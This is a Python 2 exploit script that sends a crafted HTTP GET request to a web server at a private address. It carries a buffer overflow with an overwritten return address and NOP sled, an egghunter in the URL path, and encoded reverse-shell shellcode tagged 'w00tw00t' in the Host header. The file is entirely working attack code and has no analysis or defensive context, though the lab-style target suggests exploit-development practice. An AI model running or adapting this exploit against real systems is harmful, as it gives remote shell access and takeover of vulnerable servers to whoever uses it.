#!/usr/bin/python

import socket
import os
import sys
import struct

ip = "192.168.100.120"
port = 8080

# w00tw00t
egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

revshell  = "w00tw00t"
revshell += b"\xdd\xc5\xbf\x9f\x8e\x98\xbb\xd9\x74\x24\xf4\x58"
revshell += b"\x2b\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x13\x03\xe7"
revshell += b"\x9d\x7a\x4e\xeb\x4a\xf8\xb1\x13\x8b\x9d\x38\xf6"
revshell += b"\xba\x9d\x5f\x73\xec\x2d\x2b\xd1\x01\xc5\x79\xc1"
revshell += b"\x92\xab\x55\xe6\x13\x01\x80\xc9\xa4\x3a\xf0\x48"
revshell += b"\x27\x41\x25\xaa\x16\x8a\x38\xab\x5f\xf7\xb1\xf9"
revshell += b"\x08\x73\x67\xed\x3d\xc9\xb4\x86\x0e\xdf\xbc\x7b"
revshell += b"\xc6\xde\xed\x2a\x5c\xb9\x2d\xcd\xb1\xb1\x67\xd5"
revshell += b"\xd6\xfc\x3e\x6e\x2c\x8a\xc0\xa6\x7c\x73\x6e\x87"
revshell += b"\xb0\x86\x6e\xc0\x77\x79\x05\x38\x84\x04\x1e\xff"
revshell += b"\xf6\xd2\xab\x1b\x50\x90\x0c\xc7\x60\x75\xca\x8c"
revshell += b"\x6f\x32\x98\xca\x73\xc5\x4d\x61\x8f\x4e\x70\xa5"
revshell += b"\x19\x14\x57\x61\x41\xce\xf6\x30\x2f\xa1\x07\x22"
revshell += b"\x90\x1e\xa2\x29\x3d\x4a\xdf\x70\x2a\xbf\xd2\x8a"
revshell += b"\xaa\xd7\x65\xf9\x98\x78\xde\x95\x90\xf1\xf8\x62"
revshell += b"\xd6\x2b\xbc\xfc\x29\xd4\xbd\xd5\xed\x80\xed\x4d"
revshell += b"\xc7\xa8\x65\x8d\xe8\x7c\x29\xdd\x46\x2f\x8a\x8d"
revshell += b"\x26\x9f\x62\xc7\xa8\xc0\x93\xe8\x62\x69\x39\x13"
revshell += b"\xe5\x56\x16\x7f\x80\x3e\x65\x7f\x7b\xe3\xe0\x99"
revshell += b"\x11\x0b\xa5\x32\x8e\xb2\xec\xc8\x2f\x3a\x3b\xb5"
revshell += b"\x70\xb0\xc8\x4a\x3e\x31\xa4\x58\xd7\xb1\xf3\x02"
revshell += b"\x7e\xcd\x29\x2a\x1c\x5c\xb6\xaa\x6b\x7d\x61\xfd"
revshell += b"\x3c\xb3\x78\x6b\xd1\xea\xd2\x89\x28\x6a\x1c\x09"
revshell += b"\xf7\x4f\xa3\x90\x7a\xeb\x87\x82\x42\xf4\x83\xf6"
revshell += b"\x1a\xa3\x5d\xa0\xdc\x1d\x2c\x1a\xb7\xf2\xe6\xca"
revshell += b"\x4e\x39\x39\x8c\x4e\x14\xcf\x70\xfe\xc1\x96\x8f"
revshell += b"\xcf\x85\x1e\xe8\x2d\x36\xe0\x23\xf6\x46\xab\x69"
revshell += b"\x5f\xcf\x72\xf8\xdd\x92\x84\xd7\x22\xab\x06\xdd"
revshell += b"\xda\x48\x16\x94\xdf\x15\x90\x45\x92\x06\x75\x69"
revshell += b"\x01\x26\x5c"


crash  = "A" * 101
crash += struct.pack("<I", 0x75f5365f)
crash += "\x90" * 30
crash += egghunter
crash += "C" * (330 - len(crash))

req  = "GET /" + crash + " HTTP/1.1\r\n"
req += "Host: 192.168.100.120:8080 " + revshell + " \r\n"
req += "User-Agent: Mozilla/5.0 \r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

